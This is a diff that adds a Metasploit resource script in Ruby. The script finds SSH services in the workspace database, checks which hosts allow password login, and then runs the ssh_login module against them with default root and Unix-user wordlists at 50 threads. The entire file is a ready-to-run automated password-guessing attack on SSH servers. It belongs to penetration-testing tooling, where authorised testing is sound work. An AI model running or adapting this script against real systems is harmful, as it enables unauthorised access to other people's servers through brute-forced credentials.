@@ -1,0 +1,66 @@
+<ruby>
+require 'set'
+
+
+#
+# Search for ssh servers with passwords enabled.
+#
+
+ports = Set.new()
+search_term = 'ssh'
+
+framework.db.services(framework.db.workspace, true, 'tcp', nil).each do |service|
+    host = service.host
+    next unless(
+      host.attribute_names.any? { |a| host[a.intern].to_s.match(search_term)} or
+      service.attribute_names.any? { |a| service[a.intern].to_s.match(search_term)}
+    )
+    ports.add service.port.to_i
+end
+
+run_single("use auxiliary/scanner/ssh/ssh_password_enabled")
+run_single("set THREADS 50")
+
+ports.each do |port|
+    run_single("services -u -S '#{search_term}' -p #{port} -R")
+    run_single("set RPORT #{port}")
+    run_single("run")
+end
+
+#
+# For each system with password auth enabled now try some basic
+# passwords.
+#
+
+addresses = Hash.new{|h, k| h[k] = []}
+
+framework.db.each_note(framework.db.workspace) { |note|
+    next unless note.ntype === 'ssh_password_auth'
+    next unless note.service
+    addresses[note.service.port] << note.host.address
+    }
+
+def set_rhosts_from_addres(rhosts)
+  rhosts_file = Rex::Quickfile.new("msf-db-rhosts-")
+  framework.datastore['RHOSTS'] = 'file:'+rhosts_file.path
+  # create the output file and assign it to the RHOSTS variable
+  rhosts_file.write(rhosts.join("\n")+"\n")
+  rhosts_file.close
+end
+
+run_single("use auxiliary/scanner/ssh/ssh_login")
+run_single("set THREADS 50")
+
+userpass_file = File.join(Msf::Config.data_directory, "wordlists", "root_userpass.txt")
+run_single("set USERPASS_FILE #{userpass_file}")
+
+user_file = File.join(Msf::Config.data_directory, "wordlists", "unix_users.txt")
+run_single("set USER_FILE #{user_file}")
+
+addresses.each_pair {|port, addrs|
+    run_single("set RPORT #{port}")
+    set_rhosts_from_addres(addrs)
+    run_single("run")
+}
+
+</ruby>
